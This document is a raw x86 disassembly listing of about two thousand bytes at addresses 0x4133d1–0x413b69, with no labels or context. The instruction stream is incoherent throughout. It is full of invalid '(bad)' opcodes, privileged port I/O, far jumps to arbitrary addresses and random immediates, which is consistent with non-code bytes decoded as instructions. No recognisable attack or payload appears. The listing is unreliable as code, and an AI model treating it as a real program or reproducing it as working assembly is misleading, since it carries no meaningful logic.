  4133d1:	shl    BYTE PTR [ecx],1
  4133d3:	in     eax,0x20
  4133d5:	retf   
  4133d6:	outs   dx,BYTE PTR ds:[esi]
  4133d7:	push   esi
  4133d8:	das    
  4133d9:	pop    ebx
  4133da:	mov    eax,ds:0xa82d4a2e
  4133df:	pop    ss
  4133e0:	and    bh,BYTE PTR [esi-0x21]
  4133e3:	ja     0x4133b7
  4133e5:	sub    ecx,DWORD PTR [edi+0x3a]
  4133e8:	mov    dh,0x74
  4133ea:	add    al,0xfc
  4133ec:	aas    
  4133ed:	xchg   BYTE PTR [edi],bl
  4133ef:	cmc    
  4133f0:	push   esp
  4133f1:	mov    ah,0xc7
  4133f3:	and    ch,BYTE PTR fs:[eax+0xa]
  4133f7:	mov    DWORD PTR [edx+0x35],ebx
  4133fa:	inc    edx
  4133fb:	jnp    0x413424
  4133fd:	jnp    0x41340f
  4133ff:	cmp    edx,DWORD PTR [eax]
  413401:	shl    BYTE PTR [edx],cl
  413403:	sahf   
  413404:	xlat   BYTE PTR ds:[ebx]
  413405:	mov    bl,0x76
  413407:	dec    esp
  413408:	fcom   DWORD PTR [ebx]
  41340a:	out    dx,eax
  41340b:	(bad)  
  41340c:	scas   eax,DWORD PTR es:[edi]
  41340d:	lea    edi,[esi+0x379ea56e]
  413413:	ins    DWORD PTR es:[edi],dx
  413414:	fmul   st(4),st
  413416:	dec    ebx
  413417:	pop    ecx
  413418:	dec    ecx
  413419:	ret    
  41341a:	sti    
  41341b:	sub    ah,dh
  41341d:	cli    
  41341e:	arpl   cx,ax
  413420:	sbb    DWORD PTR [esi+esi*2],edx
  413423:	xchg   esp,eax
  413424:	pop    edx
  413425:	popf   
  413426:	les    edi,FWORD PTR [eax]
  413428:	xor    BYTE PTR [ecx-0x7e61d7],bl
  41342e:	retf   0x915f
  413431:	xchg   esi,eax
  413432:	test   edi,0x78748edc
  413438:	dec    edi
  413439:	pop    edx
  41343a:	imul   edx,DWORD PTR [edx+0x75b8d791],0xd
  413441:	adc    al,0x6c
  413443:	sar    eax,cl
  413445:	stos   BYTE PTR es:[edi],al
  413446:	mov    edx,0x8a09193
  41344b:	repnz call 0xfa3:0xe80102cc
  413453:	mov    esp,0xe10ec71d
  413458:	jmp    FWORD PTR [ebp-0x6a]
  41345b:	xor    dl,bl
  41345d:	cs cmp al,0xb7
  413460:	xchg   bl,dl
  413462:	jae    0x413432
  413464:	push   ds
  413465:	ret    
  413466:	lds    ecx,FWORD PTR [ebp+0x3125652]
  41346c:	and    ebx,DWORD PTR [ebx-0x20]
  41346f:	jnp    0x41343d
  413471:	pop    ecx
  413472:	(bad)  
  413473:	outs   dx,DWORD PTR ds:[esi]
  413474:	stos   BYTE PTR es:[edi],al
  413475:	int    0x4b
  413477:	mov    ah,dh
  413479:	dec    eax
  41347a:	jo     0x413420
  41347c:	xchg   edx,eax
  41347d:	mov    ebx,0x266cbcf2
  413482:	push   cs
  413483:	sub    DWORD PTR ds:0xa94733be,esi
  413489:	mov    al,ds:0xcc000fe2
  41348e:	sbb    DWORD PTR [esi+0x17df1ea7],eax
  413494:	or     BYTE PTR [ebx+0x6b],al
  413497:	rol    cl,0x96
  41349a:	lock dec ebx
  41349c:	mov    esp,0xcc02387c
  4134a1:	pop    ds
  4134a2:	jne    0x41347d
  4134a4:	inc    esp
  4134a5:	out    0xaa,al
  4134a7:	adc    al,BYTE PTR [ebx-0x440b7203]
  4134ad:	or     al,0x1e
  4134af:	sbb    al,0xec
  4134b1:	mov    ebx,0xa730b229
  4134b6:	xor    DWORD PTR [edi+0x55],eax
  4134b9:	mov    ah,0x19
  4134bb:	sub    BYTE PTR [edi+0x6b],al
  4134be:	mov    eax,0x5a740aa2
  4134c3:	xchg   edi,eax
  4134c4:	scas   eax,DWORD PTR es:[edi]
  4134c5:	dec    edx
  4134c6:	adc    eax,0xdca46068
  4134cb:	cmp    eax,0xfc74c7f8
  4134d0:	repnz xor DWORD PTR [edx],edi
  4134d3:	push   eax
  4134d4:	push   esi
  4134d5:	dec    ebx
  4134d6:	clc    
  4134d7:	add    eax,0x3aea7f31
  4134dc:	jno    0x4134f4
  4134de:	pop    esi
  4134df:	inc    ebp
  4134e0:	rcr    DWORD PTR [ecx+0x48],1
  4134e3:	fadd   st(5),st
  4134e5:	dec    esp
  4134e6:	fidivr DWORD PTR [eax-0x76]
  4134e9:	xchg   edi,eax
  4134ea:	and    eax,0xf98aafe4
  4134ef:	fcom   DWORD PTR [edx-0x6e]
  4134f2:	or     eax,0x327506fc
  4134f7:	popa   
  4134f8:	(bad)  
  4134f9:	pop    ss
  4134fa:	int3   
  4134fb:	and    eax,0xcf072203
  413500:	out    0xea,eax
  413502:	pop    eax
  413503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413504:	add    cl,BYTE PTR [edx+0x6446953a]
  41350a:	into   
  41350b:	movnti DWORD PTR [ebx-0x72],ebx
  41350f:	mov    esp,0xbb64286c
  413514:	dec    ecx
  413515:	fstp   TBYTE PTR [esi]
  413517:	stos   DWORD PTR es:[edi],eax
  413518:	pusha  
  413519:	lahf   
  41351a:	es loope 0x4134f9
  41351d:	(bad)  
  41351e:	xchg   ecx,eax
  41351f:	inc    eax
  413520:	ror    DWORD PTR [ebp+0xf],cl
  413523:	and    DWORD PTR [eax+0x2fce36f4],eax
  413529:	jmp    0xc8a7842e
  41352e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413530:	mov    esp,0x4cd3499a
  413535:	aas    
  413536:	mov    ecx,0xa77d6ecd
  41353b:	sti    
  41353c:	loope  0x4134d6
  41353e:	loopne 0x413582
  413540:	(bad)  
  413542:	aas    
  413543:	sub    bh,BYTE PTR [eax+edi*1]
  413546:	sbb    BYTE PTR [eax],dh
  413548:	inc    ebp
  413549:	xchg   edi,eax
  41354a:	xchg   esi,eax
  41354b:	sar    BYTE PTR [esi+0x366e0a8c],cl
  413551:	adc    BYTE PTR [ebx-0x6e],bh
  413554:	xlat   BYTE PTR ds:[ebx]
  413555:	push   ds
  413556:	mov    al,0xb
  413558:	and    al,0xda
  41355a:	mov    edi,0x8b1f26df
  41355f:	int3   
  413560:	cmp    bh,BYTE PTR [edx]
  413562:	sbb    eax,0x20a460de
  413567:	jb     0x41359d
  413569:	cld    
  41356a:	jbe    0x413556
  41356c:	les    ecx,FWORD PTR [ebp-0x57]
  41356f:	sub    ebx,DWORD PTR [edx+0x61]
  413572:	xor    edx,DWORD PTR [esp+eax*4-0x5a]
  413576:	push   0x3a0b30cc
  41357b:	(bad)  
  41357c:	ds pushf 
  41357e:	pop    edi
  41357f:	je     0x4135b1
  413581:	cld    
  413582:	or     DWORD PTR [esi],0x3fb01773
  413588:	sbb    ah,BYTE PTR ds:0x170bdaeb
  41358e:	test   DWORD PTR [ebx-0x1b2a989a],edi
  413594:	push   cs
  413595:	test   DWORD PTR [edi+0x7b187b54],eax
  41359b:	cmp    DWORD PTR [edi],esi
  41359d:	retf   0x7439
  4135a0:	jb     0x4135be
  4135a2:	ds push ebp
  4135a4:	fstp   DWORD PTR [ecx]
  4135a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135a7:	add    bh,0xbf
  4135aa:	push   0x4c
  4135ac:	ja     0x41355a
  4135ae:	stos   BYTE PTR es:[edi],al
  4135af:	and    eax,0x2c865420
  4135b4:	test   DWORD PTR [edx+0x44c91007],eax
  4135ba:	push   ebp
  4135bb:	mov    esi,0x8e7f7b0d
  4135c0:	lods   al,BYTE PTR ds:[esi]
  4135c1:	pop    esi
  4135c2:	loop   0x413570
  4135c4:	cdq    
  4135c5:	mov    cl,0x7d
  4135c7:	add    bh,0xdb
  4135ca:	cmp    esi,eax
  4135cc:	ds pop edi
  4135ce:	and    DWORD PTR [edi+edi*2],esp
  4135d1:	sub    eax,0x4ab03e0d
  4135d6:	ins    DWORD PTR es:[edi],dx
  4135d7:	xchg   edx,eax
  4135d8:	aam    0xc9
  4135da:	adc    al,0x10
  4135dc:	in     eax,0xbc
  4135de:	std    
  4135df:	or     cl,BYTE PTR [ebp-0x795e3c2f]
  4135e5:	in     eax,dx
  4135e6:	mov    ds:0x1b63b106,eax
  4135eb:	xor    DWORD PTR [ecx+0x6bda01ee],0x16
  4135f2:	out    0x1,al
  4135f4:	mov    bh,0xdb
  4135f6:	cmp    eax,0x3f45d96a
  4135fb:	imul   ebp,DWORD PTR [edx+esi*1-0x1],0x54
  413600:	xor    dl,cl
  413602:	loope  0x413671
  413604:	add    al,0x9f
  413606:	jg     0x413628
  413608:	jo     0x41360a
  41360a:	shl    DWORD PTR [edi],0x7d
  41360d:	shld   ecx,ebp,cl
  413610:	inc    ecx
  413611:	push   es
  413612:	jns    0x413602
  413614:	xchg   ebp,eax
  413615:	ror    BYTE PTR [edi-0x1e],cl
  413618:	mov    bl,bl
  41361a:	push   es
  41361b:	cs mov esi,0x6086f60d
  413621:	arpl   WORD PTR [esi],sp
  413623:	cmp    al,0xb0
  413625:	or     ecx,ebp
  413627:	mov    eax,ds:0xa103b041
  41362c:	int3   
  41362d:	xchg   ebx,eax
  41362e:	clc    
  41362f:	pop    ds
  413630:	(bad)  
  413631:	dec    edx
  413632:	inc    esi
  413633:	(bad)  
  413634:	out    dx,eax
  413635:	lods   eax,DWORD PTR ds:[esi]
  413636:	cld    
  413637:	mov    al,0xe4
  413639:	ds fwait
  41363b:	arpl   WORD PTR [edx+esi*1],bx
  41363e:	cmp    al,0xb4
  413640:	and    edx,esp
  413642:	dec    ebx
  413643:	and    eax,0x3355a45a
  413648:	outs   dx,BYTE PTR ds:[esi]
  413649:	aam    0x4f
  41364b:	adc    esi,DWORD PTR [edx+edi*4+0xc]
  41364f:	sub    eax,esp
  413651:	das    
  413652:	nop
  413653:	dec    edx
  413654:	popf   
  413655:	mov    ah,0x31
  413657:	cmp    al,0xe8
  413659:	push   ebp
  41365a:	cli    
  41365b:	pop    esi
  41365c:	inc    ebx
  41365d:	inc    eax
  41365e:	sub    eax,0x2f9af79e
  413663:	sar    cl,cl
  413665:	jecxz  0x413609
  413667:	sti    
  413668:	xchg   ecx,eax
  413669:	xor    al,0xc3
  41366b:	int    0x90
  41366d:	scas   eax,DWORD PTR es:[edi]
  41366e:	dec    edi
  41366f:	test   BYTE PTR [edx],bh
  413671:	fwait
  413672:	repnz loope 0x413641
  413675:	sbb    eax,0xe6c5a838
  41367a:	(bad)  
  41367b:	fst    QWORD PTR [edx+0x8]
  41367e:	mov    bl,0xa1
  413680:	xor    ah,BYTE PTR [ebx+0x17]
  413683:	mov    ds:0xe11b2d28,al
  413688:	sub    al,0x4f
  41368a:	sbb    al,0x9c
  41368c:	jbe    0x413657
  41368e:	test   ecx,0xef0370a3
  413694:	sahf   
  413695:	xchg   edx,eax
  413696:	or     eax,0xc7a2ec99
  41369b:	push   ebx
  41369c:	pop    ebx
  41369d:	jae    0x413635
  41369f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136a0:	xchg   edx,eax
  4136a1:	out    dx,al
  4136a2:	je     0x413634
  4136a4:	push   ebx
  4136a5:	adc    esi,DWORD PTR [esi+eiz*2+0x36e86244]
  4136ac:	jnp    0x413670
  4136ae:	sub    al,0x67
  4136b0:	lods   eax,DWORD PTR ds:[esi]
  4136b1:	xchg   BYTE PTR [edi],cl
  4136b3:	inc    esp
  4136b4:	loope  0x413636
  4136b6:	pop    edx
  4136b7:	in     al,dx
  4136b8:	dec    ebp
  4136b9:	push   ss
  4136ba:	push   ds
  4136bb:	inc    eax
  4136bc:	jmp    0x9899:0xb341d915
  4136c3:	mov    dh,0x4f
  4136c5:	sub    cl,BYTE PTR [ecx]
  4136c7:	jbe    0x41369a
  4136c9:	cld    
  4136ca:	sub    ch,BYTE PTR [ebx]
  4136cc:	push   0x6614381b
  4136d1:	stos   DWORD PTR es:[edi],eax
  4136d2:	jle    0x413718
  4136d4:	or     esi,DWORD PTR [eax]
  4136d6:	push   ecx
  4136d7:	repnz lea esp,[ebp+0x4b9e8109]
  4136de:	fbstp  TBYTE PTR [edx+eax*2+0x2ba598f8]
  4136e5:	xchg   edi,eax
  4136e6:	push   ecx
  4136e7:	push   cs
  4136e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136e9:	sbb    bh,al
  4136eb:	jnp    0x413673
  4136ed:	inc    ebp
  4136ee:	inc    edi
  4136ef:	mov    cl,0x7a
  4136f1:	mov    WORD PTR [ebx+eiz*8-0x1e],cs
  4136f5:	jl     0x4136fd
  4136f7:	inc    ecx
  4136f8:	mul    DWORD PTR [edi]
  4136fa:	jne    0x41374b
  4136fc:	pop    esp
  4136fd:	sbb    al,0xcd
  4136ff:	cwde   
  413700:	cmp    ebp,edx
  413702:	popf   
  413703:	and    al,0x38
  413705:	jp     0x4136d0
  413707:	sahf   
  413708:	sub    DWORD PTR [eax],eax
  41370a:	sub    eax,0xd7a3f3e2
  41370f:	mov    ebx,0x4e46b5a8
  413714:	inc    ebp
  413715:	or     ebp,0xaf6cb305
  41371b:	mov    WORD PTR ds:0xa63ad6b1,ss
  413721:	sbb    eax,0xff46c285
  413726:	gs pop ebx
  413728:	sbb    BYTE PTR [edi+esi*1],bl
  41372b:	add    edx,DWORD PTR [eax]
  41372d:	icebp  
  41372e:	(bad)  
  41372f:	call   0xcee27a15
  413734:	xor    edx,esi
  413736:	mov    esp,0x9821922e
  41373b:	dec    edi
  41373c:	push   edx
  41373d:	fmul   DWORD PTR [edi]
  41373f:	stos   DWORD PTR es:[edi],eax
  413740:	aam    0xe9
  413742:	aam    0x8d
  413744:	push   es
  413745:	sti    
  413746:	sar    DWORD PTR [esi-0x758c85f3],1
  41374c:	jno    0x41371f
  41374e:	test   eax,0x4edf3396
  413753:	dec    esi
  413754:	sub    BYTE PTR cs:0x92af90cb,ah
  41375b:	inc    ebx
  41375c:	pop    ebp
  41375d:	mov    bh,0xc8
  41375f:	push   ebx
  413760:	je     0x4136f2
  413762:	or     al,ah
  413764:	push   ds
  413765:	push   edi
  413766:	nop
  413767:	push   esp
  413768:	cmp    BYTE PTR [ecx+0x7f991893],cl
  41376e:	push   ecx
  41376f:	sar    DWORD PTR [edx-0x36],cl
  413772:	inc    ebp
  413773:	or     eax,0x64ccaac0
  413778:	jo     0x413746
  41377a:	jl     0x413791
  41377c:	stc    
  41377d:	inc    esp
  41377e:	mov    ch,0xf3
  413780:	jl     0x41373e
  413782:	pusha  
  413783:	mov    ebp,0xb006b883
  413788:	int    0x61
  41378a:	pop    ebx
  41378b:	outs   dx,DWORD PTR ds:[esi]
  41378c:	adc    BYTE PTR [edi],ah
  41378e:	jp     0x4137cc
  413790:	add    al,0x1d
  413792:	push   es
  413793:	jo     0x4137bd
  413795:	cmp    al,0x7e
  413797:	sti    
  413798:	cmp    al,0x11
  41379a:	jecxz  0x413810
  41379c:	pop    esp
  41379d:	sbb    eax,0x956550bd
  4137a2:	pop    eax
  4137a3:	loop   0x41378c
  4137a5:	adc    cl,bl
  4137a7:	or     BYTE PTR [edi+0x67b54067],al
  4137ad:	cmp    BYTE PTR [ecx],bl
  4137af:	lods   eax,DWORD PTR ds:[esi]
  4137b0:	cdq    
  4137b1:	mov    WORD PTR [ecx-0x70],gs
  4137b4:	rcl    BYTE PTR [eax+0x28],cl
  4137b7:	daa    
  4137b8:	mov    ds:0xf9c44766,eax
  4137bd:	test   BYTE PTR [ecx-0x21b3fdbe],bl
  4137c3:	mov    edx,0xb76b822d
  4137c8:	xchg   esi,eax
  4137c9:	enter  0x2cbd,0x72
  4137cd:	mov    ch,0xa0
  4137cf:	jbe    0x413807
  4137d1:	mov    dh,0x17
  4137d3:	ret    0xa79d
  4137d6:	dec    edx
  4137d7:	add    cl,BYTE PTR [ecx-0x77]
  4137da:	cmp    al,cl
  4137dc:	lods   al,BYTE PTR ds:[esi]
  4137dd:	inc    ebp
  4137de:	faddp  st(3),st
  4137e0:	sub    eax,0xcf511044
  4137e5:	stos   DWORD PTR es:[edi],eax
  4137e6:	jmp    0x47827b8
  4137eb:	or     al,0xae
  4137ed:	dec    edi
  4137ee:	push   es
  4137ef:	sbb    al,0x5e
  4137f1:	(bad)  
  4137f2:	leave  
  4137f3:	imul   eax,ecx,0xb071bded
  4137f9:	or     DWORD PTR [edx],edi
  4137fb:	xchg   edx,eax
  4137fc:	jmp    0x5716:0xa0cbc3ff
  413803:	xor    DWORD PTR [esi-0x70eeda59],esi
  413809:	and    al,0x11
  41380b:	or     bh,BYTE PTR [edi]
  41380d:	jae    0x413846
  41380f:	mov    ebx,ebx
  413811:	mov    bl,0x32
  413813:	and    BYTE PTR [edx-0x67],0x7d
  413817:	jl     0x41383d
  413819:	das    
  41381a:	fnstenv [edx]
  41381c:	xchg   ebp,eax
  41381d:	dec    edx
  41381e:	ins    BYTE PTR es:[edi],dx
  41381f:	mov    ecx,0x39f77011
  413824:	fsub   st(6),st
  413826:	sbb    BYTE PTR [ebp-0x4d],dh
  413829:	sbb    al,0xd9
  41382b:	test   DWORD PTR [eax-0x59ecf3fa],eax
  413831:	fiadd  DWORD PTR [edx]
  413833:	sahf   
  413834:	outs   dx,DWORD PTR ds:[esi]
  413835:	inc    ebp
  413836:	in     eax,0xcf
  413838:	adc    eax,0x93815409
  41383d:	sub    BYTE PTR [eax+ebx*1-0x3f],cl
  413841:	pop    eax
  413842:	popf   
  413843:	push   edx
  413844:	jle    0x413861
  413846:	sub    esi,ecx
  413848:	fstp   DWORD PTR [ebx+edi*2-0x3e1e9964]
  41384f:	popa   
  413850:	out    dx,al
  413851:	xchg   esp,eax
  413852:	rcr    BYTE PTR [esi+ebp*4],0x45
  413856:	push   ebp
  413857:	loope  0x413890
  413859:	arpl   bx,di
  41385b:	cmp    eax,0xbc76f8af
  413860:	pusha  
  413861:	jb     0x4138c4
  413863:	cmc    
  413864:	fwait
  413865:	pop    ebp
  413866:	pushf  
  413867:	das    
  413868:	cmc    
  413869:	fwait
  41386a:	push   edx
  41386b:	xchg   ecx,eax
  41386c:	xor    esp,DWORD PTR [ecx-0x11fd5ee5]
  413872:	fbld   TBYTE PTR [edi]
  413874:	enter  0xab07,0x27
  413878:	sbb    eax,0x4bf95fa5
  41387d:	test   al,0x96
  41387f:	push   ecx
  413880:	cmp    bl,BYTE PTR [esi]
  413882:	sbb    bl,BYTE PTR [eax]
  413884:	pop    esp
  413885:	cs test al,0x14
  413888:	fsubr  QWORD PTR [edi]
  41388a:	ror    DWORD PTR [edi-0x1b21841],0x7
  413891:	mov    eax,0xf550b51e
  413896:	mov    BYTE PTR [ebx],bl
  413898:	xchg   edx,eax
  413899:	push   edx
  41389a:	and    cl,BYTE PTR [ebp-0x5ad2ff6d]
  4138a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138a1:	pop    esi
  4138a2:	push   ss
  4138a3:	inc    eax
  4138a4:	jmp    0x624a:0x962334a7
  4138ab:	inc    esi
  4138ac:	loop   0x413853
  4138ae:	pop    esp
  4138af:	sti    
  4138b0:	mov    bl,0x41
  4138b2:	add    ebp,DWORD PTR [edi+0x35]
  4138b5:	mov    esp,0x78ab763b
  4138ba:	xchg   esp,eax
  4138bb:	or     DWORD PTR [esi+0x63],esi
  4138be:	(bad)  
  4138c0:	(bad)  [eax]
  4138c2:	fldcw  WORD PTR ds:0xa2b3c60d
  4138c8:	es xchg ebp,eax
  4138ca:	mov    BYTE PTR [edx-0x22472e2],al
  4138d0:	arpl   cx,bx
  4138d2:	mov    al,ds:0x47342bfc
  4138d7:	mov    esi,?
  4138d9:	inc    ecx
  4138da:	sub    DWORD PTR [edx-0x4d574971],esp
  4138e0:	pop    ss
  4138e1:	lds    ebp,FWORD PTR [edx-0xee60352]
  4138e7:	adc    esi,edx
  4138e9:	ror    DWORD PTR [edx],cl
  4138eb:	jecxz  0x4138d9
  4138ed:	je     0x4138cd
  4138ef:	adc    eax,0xaf0861fe
  4138f4:	in     al,dx
  4138f5:	dec    ebp
  4138f6:	cmc    
  4138f7:	lock aad 0x96
  4138fa:	or     dh,BYTE PTR [edi]
  4138fc:	sahf   
  4138fd:	imul   ecx,DWORD PTR [edx+0x55],0xffffffac
  413901:	cli    
  413902:	call   0xccca44ba
  413907:	pop    es
  413908:	(bad)  
  413909:	mov    eax,ds:0x7b6c656f
  41390e:	mov    cl,0x8f
  413910:	ret    
  413911:	jge    0x413977
  413913:	sar    BYTE PTR [edi+0x3e7fc0be],1
  413919:	mov    eax,ds:0xc7e006bc
  41391e:	jo     0x4138ca
  413920:	fstp   QWORD PTR [edi]
  413922:	pop    ebp
  413923:	push   edi
  413924:	push   edi
  413925:	pop    es
  413926:	in     eax,dx
  413927:	ret    
  413928:	cmp    DWORD PTR [esi+0x34],ebp
  41392b:	dec    esi
  41392c:	inc    ecx
  41392d:	pop    es
  41392e:	pop    edx
  41392f:	add    DWORD PTR [edi-0x33],eax
  413932:	push   ss
  413933:	in     al,dx
  413934:	cmp    ecx,edx
  413936:	les    edx,FWORD PTR [edi-0x51]
  413939:	cmp    ebx,ebx
  41393b:	sub    bl,ah
  41393d:	into   
  41393e:	or     eax,0x44cf1306
  413943:	imul   ecx,DWORD PTR [esi],0x3f
  413946:	xchg   DWORD PTR [ebp+0x26],edx
  413949:	and    ch,cl
  41394b:	cmp    al,0x5e
  41394d:	mov    dl,0x44
  41394f:	imul   edi,DWORD PTR [esi+0x6e71d81b],0xffffffa0
  413956:	mov    ch,0xcf
  413958:	test   BYTE PTR [esi+0x4d],cl
  41395b:	mov    ebx,0x8a31f420
  413960:	cmp    al,0x56
  413962:	dec    esp
  413963:	fld    TBYTE PTR [edi+0xb]
  413966:	pop    esp
  413967:	enter  0xeaea,0x9a
  41396b:	sub    dl,ah
  41396d:	push   0xfffffff7
  41396f:	cmc    
  413970:	into   
  413971:	xchg   esi,eax
  413972:	out    dx,al
  413973:	inc    ebp
  413974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413975:	sub    BYTE PTR [eax],bl
  413977:	aam    0x98
  413979:	cmp    al,0x42
  41397b:	push   edx
  41397c:	mov    ah,0xe6
  41397e:	pusha  
  41397f:	movq   QWORD PTR [eax-0x5e6c05cf],mm5
  413986:	xor    al,0x20
  413988:	(bad)  [ebx-0x24]
  41398b:	scas   al,BYTE PTR es:[edi]
  41398c:	and    BYTE PTR [ebp-0x63],dh
  41398f:	xor    esi,esi
  413991:	mov    ebp,0xe238072f
  413996:	jmp    0xe8926b53
  41399b:	pop    esp
  41399c:	jmp    0x6c37:0x47d41383
  4139a3:	hlt    
  4139a4:	dec    esi
  4139a5:	ss push ebp
  4139a7:	lahf   
  4139a8:	cmp    BYTE PTR [ebx],bl
  4139aa:	or     BYTE PTR [edx-0x667c742],dh
  4139b0:	popf   
  4139b1:	push   es
  4139b2:	xlat   BYTE PTR ds:[ebx]
  4139b3:	mov    esi,0x89463334
  4139b8:	push   es
  4139b9:	xchg   edi,eax
  4139ba:	mov    WORD PTR [ecx],ds
  4139bc:	mov    ds:0x5ef9fd7,al
  4139c1:	test   ecx,0x4bf0b12
  4139c7:	out    dx,al
  4139c8:	and    eax,0x473acb91
  4139cd:	pop    ss
  4139ce:	cmp    ebp,DWORD PTR [edx+0x34ee3c13]
  4139d4:	mov    al,0x67
  4139d6:	popf   
  4139d7:	push   eax
  4139d8:	mov    ds:0x13af872a,al
  4139dd:	xor    bl,ch
  4139df:	retf   0x9701
  4139e2:	dec    ecx
  4139e3:	dec    ebp
  4139e4:	dec    ecx
  4139e5:	or     ecx,DWORD PTR ds:0xce333419
  4139eb:	mov    bh,0x6c
  4139ed:	ss xor al,0x9d
  4139f0:	jnp    0x413a02
  4139f2:	inc    ecx
  4139f3:	jle    0x413a06
  4139f5:	rol    esp,cl
  4139f7:	pop    edx
  4139f8:	or     eax,0xf3bbd855
  4139fd:	int    0xe8
  4139ff:	ss (bad) 
  413a02:	xlat   BYTE PTR ds:[ebx]
  413a03:	ss inc ebp
  413a05:	cmp    al,0x69
  413a07:	fsubr  DWORD PTR [ecx+0x44425c8d]
  413a0d:	test   DWORD PTR [eax],eax
  413a0f:	out    dx,al
  413a10:	mov    ch,BYTE PTR [eax+0xb]
  413a13:	out    dx,al
  413a14:	mov    BYTE PTR [ebx+0x1e],ah
  413a17:	sbb    DWORD PTR [esi+0x32950cda],ecx
  413a1d:	adc    eax,0xdbb39541
  413a22:	popa   
  413a23:	pop    es
  413a24:	ins    BYTE PTR es:[edi],dx
  413a25:	mov    dh,0x10
  413a27:	mov    al,ds:0x207a0e14
  413a2c:	add    eax,0xc3adaceb
  413a31:	fidivr WORD PTR [ebx-0x74]
  413a34:	xchg   ebp,eax
  413a35:	jns    0x4139fc
  413a37:	les    ebx,FWORD PTR [esi]
  413a39:	lods   eax,DWORD PTR ds:[esi]
  413a3a:	test   dh,0xef
  413a3d:	sbb    ah,BYTE PTR [ecx+eiz*2]
  413a40:	popa   
  413a41:	hlt    
  413a42:	jg     0x4139f1
  413a44:	popf   
  413a45:	pop    ecx
  413a46:	dec    esp
  413a47:	push   ss
  413a48:	cmp    ch,BYTE PTR [edi-0x7bb29e88]
  413a4e:	push   ebx
  413a4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a50:	push   edi
  413a51:	mov    esp,edi
  413a53:	and    DWORD PTR [edx-0x4e],ebx
  413a56:	(bad)  
  413a57:	sbb    ebp,DWORD PTR [ebx-0x7e77556a]
  413a5d:	pop    es
  413a5e:	data16 idiv BYTE PTR [esi]
  413a61:	ficomp WORD PTR [ecx-0x30]
  413a64:	je     0x413a51
  413a66:	cmp    esp,ebx
  413a68:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  413a6a:	iret   
  413a6b:	loop   0x413ac0
  413a6d:	jg     0x413a37
  413a6f:	outs   dx,BYTE PTR ds:[esi]
  413a70:	cmp    eax,0x5c8ec2ed
  413a75:	sub    BYTE PTR ss:[edx-0x14f0fd8d],dh
  413a7c:	pushf  
  413a7d:	xor    bl,ah
  413a7f:	mov    ds:0x7270c11b,eax
  413a84:	leave  
  413a85:	test   dl,dl
  413a87:	adc    eax,esi
  413a89:	xor    ah,cl
  413a8b:	and    al,0x9a
  413a8d:	jge    0x413a60
  413a8f:	mov    cl,0xca
  413a91:	dec    edi
  413a92:	xchg   edx,eax
  413a93:	push   ss
  413a94:	adc    BYTE PTR [edi+0x24fe07ad],dh
  413a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a9b:	or     ah,dl
  413a9d:	pop    ebx
  413a9e:	mov    edx,0x3c4a1b4
  413aa3:	mov    al,0x31
  413aa5:	out    dx,al
  413aa6:	retf   0x100a
  413aa9:	inc    edi
  413aaa:	mov    ebx,ecx
  413aac:	std    
  413aad:	xor    bh,BYTE PTR [edx]
  413aaf:	mov    eax,0x29be0e92
  413ab4:	mov    ebx,0x4aae1f3b
  413ab9:	iret   
  413aba:	in     eax,0x6c
  413abc:	pusha  
  413abd:	pop    ebx
  413abe:	fsubrp st(3),st
  413ac0:	popf   
  413ac1:	pop    ss
  413ac2:	dec    ebx
  413ac3:	dec    edx
  413ac4:	repz cs jl 0x413ada
  413ac8:	pop    es
  413ac9:	rol    DWORD PTR [ebx+0x6a],cl
  413acc:	fld    st(2)
  413ace:	je     0x413ac5
  413ad0:	sub    BYTE PTR [esi],bh
  413ad2:	xor    edx,esi
  413ad4:	rcl    BYTE PTR [edx+0x74],cl
  413ad7:	push   ecx
  413ad8:	cmp    DWORD PTR [edi],ebp
  413ada:	cli    
  413adb:	sub    dh,BYTE PTR [eax+0x780da205]
  413ae1:	pop    es
  413ae2:	scas   eax,DWORD PTR es:[edi]
  413ae3:	or     DWORD PTR [edx+0x5a5f98dc],edi
  413ae9:	repnz pusha 
  413aeb:	retf   0x82fb
  413aee:	xor    edi,DWORD PTR [edx+edi*4-0x5c2f239]
  413af5:	xor    eax,esp
  413af7:	xchg   edx,eax
  413af8:	and    BYTE PTR [eax+0x4368ac63],ah
  413afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aff:	loop   0x413b4d
  413b01:	sbb    edx,ebx
  413b03:	fsubr  DWORD PTR [ecx]
  413b05:	jbe    0x413ad5
  413b07:	jg     0x413b31
  413b09:	ret    
  413b0a:	xor    eax,DWORD PTR [ecx-0x5]
  413b0d:	cmp    eax,0x1d1fc4c0
  413b12:	xor    BYTE PTR ds:0xeb7b3b4,al
  413b18:	outs   dx,BYTE PTR ds:[esi]
  413b19:	bswap  ebp
  413b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b1c:	das    
  413b1d:	push   ss
  413b1e:	xor    DWORD PTR [eax+eax*1],esi
  413b21:	pop    esi
  413b22:	sbb    eax,0x10270c53
  413b27:	outs   dx,DWORD PTR ds:[esi]
  413b28:	mov    edi,0x2b64e5ef
  413b2d:	outs   dx,DWORD PTR ds:[esi]
  413b2e:	les    esi,FWORD PTR [ebx+0x43]
  413b31:	add    ch,BYTE PTR [edi+0x7f]
  413b34:	(bad)  
  413b35:	and    DWORD PTR [edi+0x23cfe125],esp
  413b3b:	adc    ebx,DWORD PTR [ebx]
  413b3d:	mov    ch,0x12
  413b3f:	xchg   esi,eax
  413b40:	pop    esi
  413b41:	sbb    cl,BYTE PTR [esi+0x6d192b18]
  413b47:	mov    edi,0xda3717e1
  413b4c:	(bad)  
  413b4d:	fidivr DWORD PTR [ebx+0x5bb175c8]
  413b53:	cmp    ch,BYTE PTR [eax-0x34]
  413b56:	(bad)  
  413b57:	xor    eax,0xf3bbeae2
  413b5c:	fldenv [ebx+ebp*2+0x3aa1f1be]
  413b63:	inc    edx
  413b64:	mov    al,ds:0x8d7d4db
  413b69:	pop    esi
